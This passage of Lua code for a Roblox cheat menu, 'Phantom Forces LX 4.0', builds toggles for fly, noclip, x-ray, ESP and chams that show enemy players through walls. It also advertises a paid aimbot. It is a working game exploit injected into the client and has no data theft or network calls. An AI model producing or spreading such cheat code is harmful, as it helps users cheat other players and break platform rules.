Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Flick.Name = "Flick"
Flick.Parent = ScrollingFrame
Flick.BackgroundColor3 = Color3.new(1, 0, 0)
Flick.Position = UDim2.new(0, 0, 0.769814789, 0)
Flick.Size = UDim2.new(0, 168, 0, 35)
Flick.Font = Enum.Font.Highway
Flick.Text = "Flick Feet Back"
Flick.TextColor3 = Color3.new(1, 1, 1)
Flick.TextScaled = true
Flick.TextSize = 14
Flick.TextWrapped = true

Flick.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "821870820"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

TextLabel.Parent = Frame
TextLabel.Active = true
TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel.Position = UDim2.new(-0.055555582, 0, 0.99999994, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "Gui Made By Abusing Drugs#8194"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel_2.Position = UDim2.new(-0.0609488487, 0, -0.00374150276, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "Animation Gui"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true
end)

end)

LxBtn.MouseButton1Down:Connect(function()

local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local PhantomLxUi = Instance.new("ScreenGui")
local LxUrDad = Instance.new("Frame")
local Logo = Instance.new("ImageLabel")
local LineHEHE = Instance.new("Frame")
local Info = Instance.new("TextButton")
local HowToFrame = Instance.new("Frame")
local howTO = Instance.new("TextLabel")
local CloseV5 = Instance.new("TextButton")
local UpdatesPatches = Instance.new("TextButton")
local UpdateFrame = Instance.new("Frame")
local Info4 = Instance.new("TextLabel")
local CloseV4 = Instance.new("TextButton")
local Cursor = Instance.new("TextButton")
local Xray = Instance.new("TextButton")
local Chams = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local ESP = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local RealisticPhantomForces = Instance.new("TextButton")
local Toggle = Instance.new("TextButton")
local ScrollingFrame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Lol = Instance.new("TextLabel")
local Lol2 = Instance.new("TextLabel")
local Lol3 = Instance.new("TextLabel")
local SynStrash = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false
-- Properties

PhantomLxUi.Name = "PhantomLxUi"
PhantomLxUi.Parent = game.CoreGui

LxUrDad.Name = "LxUrDad"
LxUrDad.Parent = PhantomLxUi
LxUrDad.BackgroundColor3 = Color3.new(0, 0, 0)
LxUrDad.BackgroundTransparency = 0.30000001192093
LxUrDad.BorderColor3 = Color3.new(1, 0, 0)
LxUrDad.BorderSizePixel = 4
LxUrDad.Position = UDim2.new(0.00493522501, 0, 0.144960359, 0)
LxUrDad.Size = UDim2.new(0, 270, 0, 568)

Logo.Name = "Logo"
Logo.Parent = LxUrDad
Logo.BackgroundColor3 = Color3.new(1, 1, 1)
Logo.BackgroundTransparency = 1
Logo.Size = UDim2.new(0, 270, 0, 81)
Logo.Image = "rbxassetid://2162041358"
Logo.ScaleType = Enum.ScaleType.Fit

LineHEHE.Name = "LineHEHE"
LineHEHE.Parent = LxUrDad
LineHEHE.BackgroundColor3 = Color3.new(1, 0, 0)
LineHEHE.BackgroundTransparency = 0.30000001192093
LineHEHE.BorderSizePixel = 0
LineHEHE.Position = UDim2.new(0, 0, 0.125972003, 0)
LineHEHE.Size = UDim2.new(0, 270, 0, 3)

Info.Name = "Info"
Info.Parent = LxUrDad
Info.BackgroundColor3 = Color3.new(1, 1, 1)
Info.BackgroundTransparency = 0.9990000128746
Info.BorderSizePixel = 0
Info.Position = UDim2.new(0, 0, 0, 443)
Info.Size = UDim2.new(0, 270, 0, 44)
Info.Font = Enum.Font.SciFi
Info.Text = "How To Use"
Info.TextColor3 = Color3.new(1, 1, 1)
Info.TextSize = 28

HowToFrame.Name = "HowToFrame"
HowToFrame.Parent = Info
HowToFrame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
HowToFrame.Position = UDim2.new(2.1995101, 0, -11.295454, 0)
HowToFrame.Size = UDim2.new(0, 720, 0, 766)
HowToFrame.Visible = false

howTO.Name = "howTO"
howTO.Parent = HowToFrame
howTO.BackgroundColor3 = Color3.new(1, 1, 1)
howTO.BackgroundTransparency = 1
howTO.BorderSizePixel = 0
howTO.Position = UDim2.new(0, 0, 0.0339425579, 0)
howTO.Size = UDim2.new(0, 720, 0, 728)
howTO.Font = Enum.Font.SourceSans
howTO.Text = "Works with: All Executors that are paid c:\n\nX-Ray: Once you Click this Press \"x\" to Delete the map and \"e\" to add it back\n\nFly: Press Fly and then press space and fly up, let go space and you walk on air\n\nEsp: Shows a Character through the map in red\n\nEsp Chams: Shows a Character through the map with his body parts shown in different colors\n\nCursor: Makes a Cursor in the middle of your screen to make it more kooler xd\n\nNoclip: Press noclip, and walk through all the walls you want :D\n\nAimbot: Premium lx Versions(5$)\n\nSpeed Walk: Premium lx Versions(5$)\n\nLoopHeal: Premium lx Versions(5$)\n\nEverything else is Premium lx Paid(5$)"
howTO.TextColor3 = Color3.new(1, 1, 1)
howTO.TextScaled = true
howTO.TextSize = 14
howTO.TextWrapped = true

CloseV5.Name = "CloseV5"
CloseV5.Parent = HowToFrame
CloseV5.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
CloseV5.BorderSizePixel = 0
CloseV5.Position = UDim2.new(0.894444466, 0, 0, 0)
CloseV5.Size = UDim2.new(0, 76, 0, 26)
CloseV5.Font = Enum.Font.SourceSans
CloseV5.Text = "Close"
CloseV5.TextColor3 = Color3.new(0, 1, 0)
CloseV5.TextSize = 20

UpdatesPatches.Name = "Updates/Patches"
UpdatesPatches.Parent = LxUrDad
UpdatesPatches.BackgroundColor3 = Color3.new(1, 1, 1)
UpdatesPatches.BackgroundTransparency = 0.9990000128746
UpdatesPatches.BorderSizePixel = 0
UpdatesPatches.Position = UDim2.new(0, 0, 0, 487)
UpdatesPatches.Size = UDim2.new(0, 270, 0, 81)
UpdatesPatches.Font = Enum.Font.SciFi
UpdatesPatches.Text = "Updates/Patches"
UpdatesPatches.TextColor3 = Color3.new(1, 1, 1)
UpdatesPatches.TextSize = 28

UpdateFrame.Name = "UpdateFrame"
UpdateFrame.Parent = UpdatesPatches
UpdateFrame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
UpdateFrame.BorderSizePixel = 0
UpdateFrame.Position = UDim2.new(2.01686954, 0, -6.68350029, 0)
UpdateFrame.Size = UDim2.new(0, 720, 0, 766)
UpdateFrame.Visible = false

Info4.Name = "Info4"
Info4.Parent = UpdateFrame
Info4.BackgroundColor3 = Color3.new(1, 1, 1)
Info4.BackgroundTransparency = 1
Info4.Position = UDim2.new(1.49011612e-08, 0, 0.0496083498, 0)
Info4.Size = UDim2.new(0, 720, 0, 728)
Info4.Font = Enum.Font.SourceSans
Info4.Text = "Patch Update 4.0 Rewrite 8/4/18\n--------------------------------\nYou can Turn On and off every Function\nAdded function \"Cursor\"\nAdded a Real Life PF function ;)\nAdded another section for how to use\nRewrote a Couple Functions to Run Better(X-ray, Esp)\n\n\nPatch Update 3.0 Rewrite 7/16/18\n---------------------------------\nUpdated every Function\nUpdated UI\nAdded how to use\nAdd More functions\n\nPatch Update 2.0 6/13/18\n------------------------\nUpdated UI\nNo Theme\n2 new functions\nUnpatched 1 function\n\n\nPatch Update 1.0 6/13/18\n-------------------------\n2 functions\nTheme\n\nMade by ThisW0ntGetBanned#7965\nAnd Syn#3678"
Info4.TextColor3 = Color3.new(1, 1, 1)
Info4.TextScaled = true
Info4.TextSize = 15
Info4.TextWrapped = true

CloseV4.Name = "CloseV4"
CloseV4.Parent = UpdateFrame
CloseV4.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
CloseV4.BorderSizePixel = 0
CloseV4.Position = UDim2.new(0.894444466, 0, 0, 0)
CloseV4.Size = UDim2.new(0, 76, 0, 26)
CloseV4.Font = Enum.Font.SourceSans
CloseV4.Text = "Close"
CloseV4.TextColor3 = Color3.new(0, 1, 0)
CloseV4.TextSize = 20

Cursor.Name = "Cursor"
Cursor.Parent = LxUrDad
Cursor.BackgroundColor3 = Color3.new(1, 0, 0)
Cursor.BackgroundTransparency = 1
Cursor.BorderSizePixel = 0
Cursor.Position = UDim2.new(0, 0, 0.50481987, 0)
Cursor.Size = UDim2.new(0, 270, 0, 52)
Cursor.Font = Enum.Font.SciFi
Cursor.Text = "Cursor: OFF"
Cursor.TextColor3 = Color3.new(1, 1, 1)
Cursor.TextSize = 20

Xray.Name = "X-ray"
Xray.Parent = LxUrDad
Xray.BackgroundColor3 = Color3.new(1, 0, 0)
Xray.BackgroundTransparency = 1
Xray.BorderSizePixel = 0
Xray.Position = UDim2.new(0, 0, 0.68889159, 0)
Xray.Size = UDim2.new(0, 270, 0, 52)
Xray.Font = Enum.Font.SciFi
Xray.Text = "X-Ray: OFF"
Xray.TextColor3 = Color3.new(1, 1, 1)
Xray.TextSize = 20

Chams.Name = "Chams"
Chams.Parent = LxUrDad
Chams.BackgroundColor3 = Color3.new(1, 0, 0)
Chams.BackgroundTransparency = 1
Chams.BorderSizePixel = 0
Chams.Position = UDim2.new(0, 0, 0.597237647, 0)
Chams.Size = UDim2.new(0, 270, 0, 52)
Chams.Font = Enum.Font.SciFi
Chams.Text = "Chams: OFF"
Chams.TextColor3 = Color3.new(1, 1, 1)
Chams.TextSize = 20

NoClip.Name = "NoClip"
NoClip.Parent = LxUrDad
NoClip.BackgroundColor3 = Color3.new(1, 0, 0)
NoClip.BackgroundTransparency = 1
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0, 0, 0.325890273, 0)
NoClip.Size = UDim2.new(0, 270, 0, 51)
NoClip.Font = Enum.Font.SciFi
NoClip.Text = "Noclip: OFF"
NoClip.TextColor3 = Color3.new(1, 1, 1)
NoClip.TextSize = 20

ESP.Name = "ESP"
ESP.Parent = LxUrDad
ESP.BackgroundColor3 = Color3.new(1, 0, 0)
ESP.BackgroundTransparency = 8
ESP.BorderSizePixel = 0
ESP.Position = UDim2.new(0, 0, 0.233546302, 0)
ESP.Size = UDim2.new(0, 270, 0, 52)
ESP.Font = Enum.Font.SciFi
ESP.Text = "Esp: OFF"
ESP.TextColor3 = Color3.new(1, 1, 1)
ESP.TextSize = 20

Fly.Name = "Fly"
Fly.Parent = LxUrDad
Fly.BackgroundColor3 = Color3.new(1, 0, 0)
Fly.BackgroundTransparency = 1
Fly.BorderSizePixel = 0
Fly.Position = UDim2.new(0, 0, 0.142369628, 0)
Fly.Size = UDim2.new(0, 270, 0, 52)
Fly.Font = Enum.Font.SciFi
Fly.Text = "Fly: OFF"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextSize = 20

RealisticPhantomForces.Name = "Realistic Phantom Forces"
RealisticPhantomForces.Parent = LxUrDad
RealisticPhantomForces.BackgroundColor3 = Color3.new(1, 0, 0)
RealisticPhantomForces.BackgroundTransparency = 1
RealisticPhantomForces.BorderSizePixel = 0
RealisticPhantomForces.Position = UDim2.new(0, 0, 0.415679008, 0)
RealisticPhantomForces.Size = UDim2.new(0, 270, 0, 51)
RealisticPhantomForces.Font = Enum.Font.SciFi
RealisticPhantomForces.Text = "Realistic Phantom Forces"
RealisticPhantomForces.TextColor3 = Color3.new(1, 1, 1)
RealisticPhantomForces.TextSize = 20

Toggle.Name = "Toggle"
Toggle.Parent = PhantomLxUi
Toggle.BackgroundColor3 = Color3.new(0, 0, 0)
Toggle.BackgroundTransparency = 0.30000001192093
Toggle.BorderColor3 = Color3.new(1, 0, 0)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.00493522501, 0, 0.827859581, 0)
Toggle.Size = UDim2.new(0, 79, 0, 24)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 0, 0)
Toggle.TextSize = 20

ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.Parent = PhantomLxUi
ScrollingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
ScrollingFrame.BackgroundTransparency = 0.30000001192093
ScrollingFrame.BorderColor3 = Color3.new(1, 0, 0)
ScrollingFrame.BorderSizePixel = 4
ScrollingFrame.Position = UDim2.new(-0.177231207, 0, 0.0113250017, 0)
ScrollingFrame.Size = UDim2.new(0, 2400, 0, 31)

TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0.144999996, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 1795, 0, 31)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Thank you for using Phantom Forces LX 4.0. - Made by ThisW0ntGetBanned#7965 and Syn#3678 - Lx Premium 4.0 allows the user to take Phantom Forces to a different approach, that is by never losing a game. This cheat gives a number of diferent option to succeed in playing the game, and letting no one get in your way."
TextLabel.TextColor3 = Color3.new(1, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

Lol.Name = "Lol"
Lol.Parent = PhantomLxUi
Lol.BackgroundColor3 = Color3.new(1, 1, 0)
Lol.BorderColor3 = Color3.new(0, 0, 0)
Lol.Position = UDim2.new(0.501733243, 0, 0.492638737, 0)
Lol.Size = UDim2.new(0, 1, 0, 12)
Lol.Font = Enum.Font.SourceSans
Lol.Text = ""
Lol.TextColor3 = Color3.new(0, 0, 0)
Lol.TextSize = 14

Lol2.Name = "Lol2"
Lol2.Parent = PhantomLxUi
Lol2.BackgroundColor3 = Color3.new(1, 1, 0)
Lol2.BorderColor3 = Color3.new(0, 0, 0)
Lol2.Position = UDim2.new(0.494472891, 0, 0.507059336, 0)
Lol2.Size = UDim2.new(0, 15, 0, 0)
Lol2.Font = Enum.Font.SourceSans
Lol2.Text = ""
Lol2.TextColor3 = Color3.new(0, 0, 0)
Lol2.TextSize = 14

Lol3.Name = "Lol3"
Lol3.Parent = PhantomLxUi
Lol3.BackgroundColor3 = Color3.new(1, 0, 0)
Lol3.BorderColor3 = Color3.new(0, 0, 0)
Lol3.Position = UDim2.new(0.494600475, 0, 0.492638767, 0)
Lol3.Size = UDim2.new(0, 16, 0, 0)
Lol3.Font = Enum.Font.SourceSans
Lol3.Text = ""
Lol3.TextColor3 = Color3.new(1, 1, 0)
Lol3.TextSize = 14

SynStrash.Name = "SynStrash"
SynStrash.Parent = PhantomLxUi
SynStrash.BackgroundColor3 = Color3.new(1, 1, 0)
SynStrash.BorderColor3 = Color3.new(0, 0, 0)
SynStrash.Position = UDim2.new(0.494139045, 0, 0.492638707, 0)
SynStrash.Size = UDim2.new(0, 1, 0, 11)
SynStrash.Font = Enum.Font.SourceSans
SynStrash.Text = ""
SynStrash.TextColor3 = Color3.new(0, 0, 0)
SynStrash.TextSize = 14

Toggle.MouseButton1Click:connect(function()
    if LxUrDad.Visible == true
        then LxUrDad.Visible = false 
    elseif 
       LxUrDad.Visible == false
        then LxUrDad.Visible = true
    end
end)

Fly.MouseButton1Click:connect(function()
	Fly.Text = "Fly: ON"
	Fly.TextColor3 = Color3.new(255,255,255)
	Fly.BackgroundTransparency = 0
	local Player = game:GetService("Players").LocalPlayer;
local UserInputService = game:GetService("UserInputService");
local Bricks = {};
local Space;
local WalkInAir = false;

UserInputService.InputBegan:Connect(function(
InputObject,
GameProcessedEvent
)
if (
(not GameProcessedEvent) and
(InputObject.UserInputType == Enum.UserInputType.Keyboard)
) then
if (InputObject.KeyCode == Enum.KeyCode.P) then
for Key, Value in next, Bricks do
Value:Destroy();
end;
elseif (InputObject.KeyCode == Enum.KeyCode.Space) then
Space = true;
elseif (InputObject.KeyCode == Enum.KeyCode.L) then
WalkInAir = (not WalkInAir);
end;
end;
end);

UserInputService.InputEnded:Connect(function(
InputObject,
GameProcessedEvent
)
if (
(not GameProcessedEvent) and
(InputObject.UserInputType == Enum.UserInputType.Keyboard)
) then
if (InputObject.KeyCode == Enum.KeyCode.Space) then
Space = nil;
end;
end;
end);

local LastPosition = Vector3.new(0, 0, 0);

game:GetService("RunService").RenderStepped:Connect(function()
local PositionChanged;
local Torso = (
Player.Character or
Player.CharacterAdded:wait()
):WaitForChild("Torso");
if ((Torso.Position - LastPosition).Magnitude > 0.75) then
PositionChanged = true;
end;
if (Space or (WalkInAir and PositionChanged)) then
local FlyBrick = Instance.new("Part",
(
Torso:GetChildren()[1] or
Torso
)
);
FlyBrick.Transparency = 1;
FlyBrick.Anchored = true;
FlyBrick.CFrame = (
Torso.CFrame *
CFrame.new(0, -2.25, 0)
);
FlyBrick.Size = Vector3.new(5, 0.05, 5);
FlyBrick.BrickColor = BrickColor.new("Institutional white");
FlyBrick.Locked = true;
FlyBrick.TopSurface = Enum.SurfaceType.SmoothNoOutlines;
FlyBrick.BottomSurface = FlyBrick.TopSurface;
FlyBrick.RightSurface = FlyBrick.TopSurface;
FlyBrick.LeftSurface = FlyBrick.TopSurface;
FlyBrick.FrontSurface = FlyBrick.TopSurface;
FlyBrick.BackSurface = FlyBrick.TopSurface;
Bricks[#Bricks + 1] = FlyBrick;
end;
LastPosition = Torso.Position;
end)
end)

ESP.MouseButton1Click:connect(function()
		ESP.Text = "ESP: ON"
	ESP.TextColor3 = Color3.new(255,255,255)
	ESP.BackgroundTransparency = 0
	function Esp(player, username)
    if player ~= game:service("Players").LocalPlayer then
    if player.Character  then
    local torso = player.Character:FindFirstChild("Torso")
    if torso then
    local base = Instance.new("BillboardGui")
    local esP = Instance.new("Frame", base)
    base.AlwaysOnTop = true
    base.Enabled = true
    base.Size = UDim2.new(4.5,0,6,0)
    base.StudsOffset = Vector3.new(0, -0.6, 0)
    esP.BackgroundColor3 = Color3.new(170,0,0) -- Edit Color Here--
    esP.BackgroundTransparency = 0.4
    esP.BorderSizePixel = 0.5
    esP.Size = UDim2.new(1,0,1,0)
    if base and workspace.CurrentCamera then
    base.Name = username
    base.Parent = workspace.CurrentCamera
    base.Adornee = torso
    end
    end
    end
    end
end

function CheckEsp()
    for x,player in pairs(game:service("Players"):GetPlayers()) do
    if player then
        if player.TeamColor ~= game:service("Players").LocalPlayer.TeamColor then
        local char = player.Character
        if char then
            local torso = char:FindFirstChild("Torso")
            if torso then
                local currentcam = workspace.CurrentCamera
                local playerName = player.Name
                if currentcam:FindFirstChild(playerName) == nil then
                    Esp(player, playerName)
                end
            end
        end
        end
    end
    end
end

while wait(1) do
    CheckEsp()
end
end)

NoClip.MouseButton1Click:connect(function()
	if NoClip.Text == "Noclip: OFF" then
		NoClip.BackgroundTransparency = 0
        Clipon = true
        NoClip.Text = "Noclip: ON"
        NoClip.TextColor3 = Color3.new(255,255,255)
        Stepped = game:GetService("RunService").Stepped:Connect(function()
            if not Clipon == false then
                for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
            else
	NoClip.BackgroundTransparency = 1
                Stepped:Disconnect()
            end
        end)
	    elseif NoClip.Text == "Noclip: ON" then
		Fly.BackgroundTransparency = 1
        Clipon = false
        NoClip.Text = "Noclip: OFF"
        NoClip.TextColor3 = Color3.new(170,0,0)
    end
end)

Chams.MouseButton1Click:connect(function()
	Chams.Text = "Chams: ON"
	Chams.TextColor3 = Color3.new(255,255,255)
	Chams.BackgroundTransparency = 0
plrs = nil
for _,p in pairs(game:GetChildren()) do
   if p.ClassName == ("Players") then
   plrs = p
   end
end


while true do
wait(0.1)
for _, v in pairs(plrs:GetChildren()) do
if v.TeamColor ~= plrs.LocalPlayer.TeamColor and not v.Character.Head:FindFirstChild("BillboardGui") then --   ~= 
i = Instance.new("BillboardGui",v.Character.Head)
i.Active = true
i.AlwaysOnTop = true
i.Size = UDim2.new(1,0,1,0)
h = Instance.new("Frame",i)
h.Size = UDim2.new(2,0,1,0)
h.AnchorPoint = Vector2.new(0.25, 0)
h.BackgroundColor3 = Color3.new(1,0,0)
h.BorderSizePixel = 0
h.BackgroundTransparency = 0.4

i2 = Instance.new("BillboardGui",v.Character.Torso)
i2.Active = true
i2.AlwaysOnTop = true
i2.Size = UDim2.new(2,0,2,0)
t = Instance.new("Frame",i2)
t.Size = UDim2.new(1,0,1,0)
t.AnchorPoint = Vector2.new(0, 0)
t.BackgroundColor3 = Color3.new(0,1,0)
t.BorderSizePixel = 0
t.BackgroundTransparency = 0.4

i3 = Instance.new("BillboardGui",v.Character["Left Arm"])
i3.Active = true
i3.AlwaysOnTop = true
i3.Size = UDim2.new(1,0,2,0)
la = Instance.new("Frame",i3)
la.Size = UDim2.new(1,0,1,0)
la.AnchorPoint = Vector2.new(0, 0)
la.BackgroundColor3 = Color3.new(0,0,1)
la.BorderSizePixel = 0
la.BackgroundTransparency = 0.4

i4 = Instance.new("BillboardGui",v.Character["Right Arm"])
i4.Active = true
i4.AlwaysOnTop = true
i4.Size = UDim2.new(1,0,2,0)
ra = Instance.new("Frame",i4)
ra.Size = UDim2.new(1,0,1,0)
ra.AnchorPoint = Vector2.new(0, 0)
ra.BackgroundColor3 = Color3.new(0,0,1)
ra.BorderSizePixel = 0
ra.BackgroundTransparency = 0.4

i5 = Instance.new("BillboardGui",v.Character["Left Leg"])
i5.Active = true
i5.AlwaysOnTop = true
i5.Size = UDim2.new(1,0,2,0)
ll = Instance.new("Frame",i5)
ll.Size = UDim2.new(1,0,1,0)
ll.AnchorPoint = Vector2.new(0, 0)
ll.BackgroundColor3 = Color3.new(0,0,1)
ll.BorderSizePixel = 0
ll.BackgroundTransparency = 0.4

i6 = Instance.new("BillboardGui",v.Character["Right Leg"])
i6.Active = true
i6.AlwaysOnTop = true
i6.Size = UDim2.new(1,0,2,0)
rl = Instance.new("Frame",i6)
rl.Size = UDim2.new(1,0,1,0)
rl.AnchorPoint = Vector2.new(0, 0)
rl.BackgroundColor3 = Color3.new(0,0,1)
rl.BorderSizePixel = 0
rl.BackgroundTransparency = 0.4
end
end
end
end)

RealisticPhantomForces.MouseButton1Click:connect(function()
	RealisticPhantomForces.Text = "Realistic Phantom Forces: ON"
	RealisticPhantomForces.TextColor3 = Color3.new(255,255,255)
	RealisticPhantomForces.BackgroundTransparency = 0
local runDummyScript = function(f,scri)
local oldenv = getfenv(f)
local newenv = setmetatable({}, {
__index = function(_, k)
if k:lower() == 'script' then
return scri
else
return oldenv[k]
end
end
})
setfenv(f, newenv)
ypcall(function() f() end)
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting")) 
mas.Name = "CompiledModel"
o1 = Instance.new("Model")
o2 = Instance.new("Model")
o3 = Instance.new("Model")
o4 = Instance.new("Part")
o5 = Instance.new("PointLight")
o6 = Instance.new("ParticleEmitter")
o7 = Instance.new("ParticleEmitter")
o8 = Instance.new("SpecialMesh")
o9 = Instance.new("Decal")
o10 = Instance.new("Decal")
o11 = Instance.new("Decal")
o12 = Instance.new("Decal")
o13 = Instance.new("Decal")
o14 = Instance.new("Decal")
o15 = Instance.new("BillboardGui")
o16 = Instance.new("ImageLabel")
o17 = Instance.new("BillboardGui")
o18 = Instance.new("ImageLabel")
o19 = Instance.new("Model")
o20 = Instance.new("Model")
o21 = Instance.new("Part")
o22 = Instance.new("Decal")
o23 = Instance.new("Decal")
o24 = Instance.new("Decal")
o25 = Instance.new("Decal")
o26 = Instance.new("Decal")
o27 = Instance.new("Decal")
o28 = Instance.new("Script")
o29 = Instance.new("Part")
o30 = Instance.new("Decal")
o31 = Instance.new("Decal")
o32 = Instance.new("Decal")
o33 = Instance.new("Decal")
o34 = Instance.new("Decal")
o35 = Instance.new("Decal")
o36 = Instance.new("Script")
o37 = Instance.new("Part")
o38 = Instance.new("Decal")
o39 = Instance.new("Decal")
o40 = Instance.new("Decal")
o41 = Instance.new("Decal")
o42 = Instance.new("Decal")
o43 = Instance.new("Decal")
o44 = Instance.new("Script")
o45 = Instance.new("Part")
o46 = Instance.new("Decal")
o47 = Instance.new("Decal")
o48 = Instance.new("Decal")
o49 = Instance.new("Decal")
o50 = Instance.new("Decal")
o51 = Instance.new("Decal")
o52 = Instance.new("Script")
o53 = Instance.new("Part")
o54 = Instance.new("Decal")
o55 = Instance.new("Decal")
o56 = Instance.new("Decal")
o57 = Instance.new("Decal")
o58 = Instance.new("Decal")
o59 = Instance.new("Decal")
o60 = Instance.new("Script")
o61 = Instance.new("Part")
o62 = Instance.new("Decal")
o63 = Instance.new("Decal")
o64 = Instance.new("Decal")
o65 = Instance.new("Decal")
o66 = Instance.new("Decal")
o67 = Instance.new("Decal")
o68 = Instance.new("Script")
o69 = Instance.new("Part")
o70 = Instance.new("Decal")
o71 = Instance.new("Decal")
o72 = Instance.new("Decal")
o73 = Instance.new("Decal")
o74 = Instance.new("Decal")
o75 = Instance.new("Decal")
o76 = Instance.new("Script")
o77 = Instance.new("Part")
o78 = Instance.new("Decal")
o79 = Instance.new("Decal")
o80 = Instance.new("Decal")
o81 = Instance.new("Decal")
o82 = Instance.new("Decal")
o83 = Instance.new("Decal")
o84 = Instance.new("Script")
o85 = Instance.new("Part")
o86 = Instance.new("Decal")
o87 = Instance.new("Decal")
o88 = Instance.new("Decal")
o89 = Instance.new("Decal")
o90 = Instance.new("Decal")
o91 = Instance.new("Decal")
o92 = Instance.new("Script")
o93 = Instance.new("Model")
o94 = Instance.new("Part")
o95 = Instance.new("Script")
o96 = Instance.new("SpecialMesh")
o97 = Instance.new("BillboardGui")
o98 = Instance.new("ImageLabel")
o99 = Instance.new("BillboardGui")
o100 = Instance.new("ImageLabel")
o101 = Instance.new("Model")
o102 = Instance.new("Model")
o103 = Instance.new("Part")
o104 = Instance.new("BillboardGui")
o105 = Instance.new("ImageButton")
o106 = Instance.new("Model")
o107 = Instance.new("Part")
o108 = Instance.new("BillboardGui")
o109 = Instance.new("ImageButton")
o110 = Instance.new("Model")
o111 = Instance.new("Part")
o112 = Instance.new("BillboardGui")
o113 = Instance.new("ImageButton")
o114 = Instance.new("Model")
o115 = Instance.new("Part")
o116 = Instance.new("BillboardGui")
o117 = Instance.new("ImageButton")
o1.Parent = mas
o2.Name = "Innovated Sun"
o2.Parent = o1
o3.Name = "Diffraction Spikes"
o3.Parent = o2
o4.Name = "Light"
o4.Parent = o3
o4.Material = Enum.Material.SmoothPlastic
o4.BrickColor = BrickColor.new("Institutional white")
o4.Transparency = 0.00099998712539673
o4.Position = Vector3.new(-1073.95825, 501.733978, 402.140839)
o4.Anchored = true
o4.FormFactor = Enum.FormFactor.Custom
o4.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o4.CFrame = CFrame.new(-1073.95825, 501.733978, 402.140839, 1, 0, 0, 0, 1, 0, 0, 0, 1)
o4.BottomSurface = Enum.SurfaceType.Unjoinable
o4.TopSurface = Enum.SurfaceType.Smooth
o4.Color = Color3.new(0.972549, 0.972549, 0.972549)
o4.Position = Vector3.new(-1073.95825, 501.733978, 402.140839)
o4.Color = Color3.new(0.972549, 0.972549, 0.972549)
o5.Parent = o4
o5.Brightness = 9
o5.Range = 60
o6.Parent = o4
o6.Size = NumberSequence.new(6,6)
o6.Color = ColorSequence.new(Color3.new(1, 1, 1),Color3.new(1, 1, 0.498039))
o6.LightEmission = 1
o6.Texture = "http://www.roblox.com/asset/?id=243660373"
o6.Lifetime = NumberRange.new(1,1)
o6.Rate = 5
o6.Speed = NumberRange.new(0,0)
o6.Color = ColorSequence.new(Color3.new(1, 1, 1),Color3.new(1, 1, 0.498039))
o7.Name = "ParticleEmitter2"
o7.Parent = o4
o7.Transparency = NumberSequence.new(1,0.74374997615814,1)
o7.Rotation = NumberRange.new(0,360)
o7.Size = NumberSequence.new(10,10)
o7.Color = ColorSequence.new(Color3.new(0.992157, 1, 0.776471),Color3.new(0.992157, 1, 0.776471))
o7.LightEmission = 1
o7.Texture = "http://www.roblox.com/asset/?id=243660364"
o7.Lifetime = NumberRange.new(1,1)
o7.Rate = 50
o7.Speed = NumberRange.new(0,0)
o7.VelocitySpread = 360
o7.Color = ColorSequence.new(Color3.new(0.992157, 1, 0.776471),Color3.new(0.992157, 1, 0.776471))
o8.Parent = o4
o8.Scale = Vector3.new(13.9580002, 13.9580002, 13.9580002)
o8.MeshType = Enum.MeshType.Sphere
o8.Scale = Vector3.new(13.9580002, 13.9580002, 13.9580002)
o9.Parent = o4
o9.Texture = "http://www.roblox.com/asset/?id=50625652"
o9.Face = Enum.NormalId.Left
o10.Parent = o4
o10.Texture = "http://www.roblox.com/asset/?id=50625652"
o10.Face = Enum.NormalId.Back
o11.Parent = o4
o11.Texture = "http://www.roblox.com/asset/?id=50625652"
o11.Face = Enum.NormalId.Right
o12.Parent = o4
o12.Texture = "http://www.roblox.com/asset/?id=50625652"
o13.Parent = o4
o13.Texture = "http://www.roblox.com/asset/?id=50625652"
o13.Face = Enum.NormalId.Top
o14.Parent = o4
o14.Texture = "http://www.roblox.com/asset/?id=50625652"
